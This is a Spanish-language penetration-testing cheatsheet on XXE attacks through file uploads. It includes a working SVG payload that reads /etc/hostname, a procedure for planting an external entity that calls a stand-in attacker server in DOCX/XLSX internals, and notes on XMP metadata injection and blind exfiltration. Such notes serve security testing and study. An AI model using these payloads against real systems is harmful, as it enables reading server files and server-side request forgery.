---
aliases:
tags:
  - type/cheatsheet
primary categories:
secondary categories:
tertiary categories:
type: CheatSheet
linked:
---
# XXE - Carga de Archivos (Formatos XML Ocultos)

***

## Cheatsheet

|**Formato Objetivo**|**Descripción de la Técnica**|**Estructura del Payload / Procedimiento**|
|---|---|---|
|**Imágenes Vectoriales (SVG)**|Los archivos SVG son inherentemente documentos XML. Incrusto la declaración de la entidad externa y la invoco dentro de un elemento de texto. Si el servidor renderiza la imagen (ej. genera un PNG a partir del SVG), el texto renderizado revelará el archivo extraído.|`<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>`|
|**Documentos Ofimáticos (DOCX / XLSX)**|Estos formatos (Office Open XML) son contenedores ZIP con múltiples archivos XML internos. La técnica consiste en descomprimir el archivo legítimo, inyectar el payload en un XML analizado invariablemente por el parser (como `[Content_Types].xml` o `word/document.xml`), y volver a empaquetarlo como `.docx` o `.xlsx`.|**1.** `unzip archivo.docx`<br><br>  <br><br>**2.** Editar `[Content_Types].xml` y agregar: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://mi-servidor.com/ssrf"> ]>`<br><br>  <br><br>**3.** Invocar `&xxe;` en un atributo o nodo válido.<br><br>  <br><br>**4.** `zip -r archivo_modificado.docx *`|
|**Metadatos incrustados (XMP)**|Formatos de imagen estáticos (JPEG, PNG, GIF) pueden contener metadatos XMP (Extensible Metadata Platform), el cual se basa en XML. Si la aplicación extrae metadatos (ej. usando ExifTool vulnerable), inyecto el payload XXE en los campos XMP usando herramientas de manipulación de metadatos.|Se inyecta la cabecera `<!DOCTYPE...>` en las etiquetas de metadatos XMP de una imagen válida y se fuerza al parser de metadatos del backend a evaluarla.|

## Requisitos y Limitaciones

- **Procesamiento Activo en Backend:** El ataque solo es viable si la aplicación procesa el archivo subido. Si el archivo se almacena directamente en un bucket de S3 o en el sistema de archivos sin que una librería abra y analice su contenido XML, el payload nunca se ejecutará.
- **Naturaleza Ciega (Blind):** En la mayoría de los casos de carga de documentos ofimáticos o extracción de metadatos, la aplicación no refleja el contenido analizado en la respuesta HTTP (solo devuelve un mensaje de "Archivo subido correctamente"). Esto hace que el ataque sea inherentemente ciego, requiriendo el uso de técnicas de [[Blind XXE]] y exfiltración [[XXE Out-of-Band (OOB)]] para recuperar la información.
- **Restricciones de Renderizado (SVG):** Para ataques _in-band_ con SVG, el servidor debe renderizar y devolver la imagen transformada (por ejemplo, como miniatura o avatar de perfil) para poder visualizar el texto extraído dentro del lienzo de la imagen.


---

## Overview

La funcionalidad de carga de archivos presenta un vector de ataque encubierto para [[XXE]] cuando la aplicación acepta formatos que, bajo la superficie, están estructurados parcial o totalmente en XML. Formatos comunes como imágenes vectoriales (SVG) o documentos ofimáticos modernos (DOCX, XLSX, PPTX) dependen de analizadores XML en el backend para procesar contenido, renderizar imágenes o extraer metadatos.

Si el servidor utiliza una librería de procesamiento multimedia o de documentos (como ImageMagick, Apache POI, etc.) que no desactiva la resolución de entidades externas, puedo explotar la carga de archivos para lograr extracción de datos locales o un [[SSRF]].


***

## Notas Relacionadas


***
